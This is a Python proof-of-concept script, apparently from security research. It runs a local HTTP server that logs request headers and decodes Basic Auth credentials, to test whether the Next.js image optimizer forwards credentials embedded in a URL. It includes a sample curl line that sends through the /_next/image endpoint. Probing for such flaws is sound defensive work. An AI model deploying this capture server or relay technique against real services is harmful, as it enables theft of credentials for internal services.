#!/usr/bin/env python3
"""
Credential Capture Server
=========================

Tests if Next.js image optimizer sends HTTP Basic Auth credentials
when included in the URL (e.g., http://user:pass@host/path).

If fetch() sends these credentials, this is a credential relay attack:
- Attacker includes internal service credentials in URL
- Next.js sends those credentials to the internal service
- This could be used to access authenticated internal endpoints
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import base64

class CredentialCaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n" + "=" * 60)
        print("[CREDENTIAL CAPTURE] Received request")
        print("=" * 60)
        print(f"Path: {self.path}")
        print(f"Client: {self.client_address}")
        print("\n--- ALL HEADERS ---")
        for header, value in self.headers.items():
            print(f"  {header}: {value}")
        
        # Check for Authorization header
        auth_header = self.headers.get('Authorization')
        if auth_header:
            print("\n" + "!" * 60)
            print("!!! AUTHORIZATION HEADER FOUND !!!")
            print("!" * 60)
            if auth_header.startswith('Basic '):
                encoded = auth_header[6:]
                try:
                    decoded = base64.b64decode(encoded).decode('utf-8')
                    print(f"Decoded credentials: {decoded}")
                except:
                    print(f"Raw encoded: {encoded}")
            else:
                print(f"Auth type: {auth_header}")
        else:
            print("\n[INFO] No Authorization header received")
        
        # Return a valid image
        # 1x1 red PNG
        png = bytes([
            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
            0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
            0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
            0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
            0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
            0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
            0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
        ])
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Content-Length', len(png))
        self.end_headers()
        self.wfile.write(png)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9804
    print("=" * 60)
    print(" Credential Capture Server")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nTest with:")
    print(f'  curl "http://localhost:3000/_next/image?url=http://admin:secret@127.0.0.1:{port}/test&w=64&q=75"')
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), CredentialCaptureHandler).serve_forever()
